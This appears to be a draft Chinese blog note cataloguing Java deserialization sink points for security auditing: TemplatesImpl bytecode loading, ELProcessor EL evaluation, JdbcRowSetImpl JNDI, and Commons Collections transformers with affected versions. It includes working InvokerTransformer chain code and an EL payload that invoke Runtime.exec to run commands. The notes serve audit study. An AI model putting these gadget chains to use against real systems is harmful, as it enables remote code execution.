---
title: "sink点"
modDatetime: 2025-01-20T00:00:00.000+08:00
description: "Java 安全审计中常见 sink 点与参数可控场景记录"
draft: true
tags: ["java"]
---

# 实例化任意类，参数可控
## TrAXFilter

这个类存在于JDK中（已知JDK21仍然是这样）
初始化时，调用传入的`templates`的newTransformer()方法
![](assets/sink点/TrAXFilter.png)
这个函数可以触发字节码加载
![](assets/sink点/TemplatesImpl-newTransformer方法.png)

`newTransformer->getTransletInstance->defineTranslateClass->defineClass(bytecodes)`
或者加载字节码后实例化

![](assets/sink点/getTransletInstance.png)

# 函数反射执行

## ELProcessor#eval
依赖：tomcat-embed-el

javax.el.ELProcessor#eval 执行EL表达式，参数为String类型

# getter
## TemplatesImpl#getOutputProperties
```
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
newTransformer->getTransletInstance
defineTranslateClass
defineClass(bytecodes)
```

# setter
## JdbcRowSetImpl
setDatasourceName后setAutocommit  --> JNDI

# transform
可以用ChainedTransformer + ConstantTransformer来控制后续transform入口参数

## InvokerTransformer
### 效果
反射调用类的public方法，参数可控

### 可用版本
cc < 3.2.2, < 4.1

cc3.2.2在readObject时候加了参数检查，默认禁止反序列化
cc4.1移除了InvokerTransformer的Serializable接口

### 使用举例
```java
Transformer[] transformers = new Transformer[]{  
        new ConstantTransformer(Runtime.class),  
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})  
};  
return new ChainedTransformer(transformers);
```

相当于是 
`Class.getMethod("getMethod", new Class[]{String.class, Class[].class}).invoke(Runtime.class, Object[]{"getRuntime", null})) -> getRuntime <Method>`
执行getMethod获取到getMethod方法，然后再执行getMethod获取到getRuntime方法，getMethod需要的参数类型是`new Class[]{String.class, Class[].class}`,代表函数名和参数类型 , 传给第二个getMethod的参数是`Object[]{"getRuntime", null}`，拿到Runtime.getRuntime无参方法

`Method.class.getMethod("invoke", ...type...).invoke(getRuntime, new Object[]{null, null})`
拿到Method的`invoke`方法，参数类型是`new Class[]{Object.class, Object[].class}`，表示在哪个对象上执行以及执行参数，由于getRuntime是static方法，对象传入null，参数也是null，执行invoke相当于执行了Runtime.getRuntime()

`Runtime.class.getMethod("exec", new Class[]{String.class}).invoke(runtime, "calc.exe")` 执行runtime.exec("calc")

同理可以执行 RegistryImpl.lookup、ELProcessor.eval
```java
# 有构造函数可以直接 newInstance
new ConstantTransformer(ELProcessor.class),  
new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),  
new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"calc.exe\")"})
```

## InstantiateTransformer
### 效果
transform方法可以实例化类，参数可控

### 可用版本
cc < 3.2.2, < 4.1

cc3.2.2在readObject时候加了参数检查，默认禁止反序列化
cc4.1移除了InvokerTransformer的Serializable接口

### 举例
CC2、CC4